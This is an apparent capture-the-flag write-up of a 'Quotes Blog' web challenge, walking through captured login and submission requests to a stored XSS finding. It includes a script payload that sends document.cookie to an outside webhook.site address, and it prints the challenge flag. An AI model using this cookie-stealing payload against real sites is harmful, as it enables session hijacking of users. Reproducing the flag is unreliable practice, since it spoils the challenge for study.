# Web: Quotes blog

We've been working hard on our new startup "Quotes Blog", a crowdsourced quotes submission platform. Can you review this application for any vulnerabilities before we launch this platform?

**Target**: 139.59.183.170:32464

---

We started by navigating to the web page. We observed a login page. We tried admin:admin, and intercepted the request and the response:

```http
[REQUEST]
POST /api/login HTTP/1.1
Host: 139.59.183.170:32464
Content-Length: 39
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://139.59.183.170:32464
Referer: http://139.59.183.170:32464/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"admin","password":"admin"}

[RESPONSE]
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 43
ETag: W/"2b-i4njf3x53MYj5moND+DsqTXL4qg"
Date: Wed, 21 Sep 2022 11:58:55 GMT
Connection: close

{"message":"Invalid username or password!"}
```
At this point we knew how an invalid login looked like. We could try to brute force it using Hydra, but we decided to try another techinques before. 

We created a new user and loggin with it. The server returned a session token, then it loaded the "feed".


```http
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjYzNzYxNjIxfQ.aoiAuzCEtIVXtn3FW_0C2dmz_iPvquJNduF85cVOyrU; Max-Age=3600; Path=/; Expires=Wed, 21 Sep 2022 13:00:21 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 46
ETag: W/"2e-FCTfdnBNtsqc3wjjuhAwgZEEoU8"
Date: Wed, 21 Sep 2022 12:00:21 GMT
Connection: close

{"message":"User authenticated successfully!"}


GET /feed HTTP/1.1
Host: 139.59.183.170:32464
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://139.59.183.170:32464/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjYzNzYxNjIxfQ.aoiAuzCEtIVXtn3FW_0C2dmz_iPvquJNduF85cVOyrU
Connection: close
```
We observed that we can write comments in the feed. It may be vulnerable to XSS. We tried with a simple script `<script>alert("alo")</script>`

Initially, our comment was not displayed in the feed (it was being "reviewed by the admin"). Nevertheless, in the page "your submissions", when the page is loaded our injected alert appeared. Thus the form was vulnerable to XSS.

We tried the web hooking technique. This time there was only one parameter, so there was only one place to inject the hook.

```http
POST /api/submit HTTP/1.1
Host: 139.59.183.170:32464
Content-Length: 15
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://139.59.183.170:32464
Referer: http://139.59.183.170:32464/feed
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjYzNzYxNjIxfQ.aoiAuzCEtIVXtn3FW_0C2dmz_iPvquJNduF85cVOyrU
Connection: close

{"content":"<script>new Image().src=\"https://webhook.site/eff815dc-37db-43cb-813e-4fa047de3dfa/?c=\"+document.cookie;</script>"}
```
Although our comment was not directly published in the feed, when the server processes the comment it would execute the hook. We navigated to "Your submissions" so that our comment was loaded thus our hook executed. Then we navigate to our <webhook.site> and saw a new hook.

![[./more_xss.png]]

Finally, `flag=HTB{m0r3_th4n_ju5t_al3rts}`




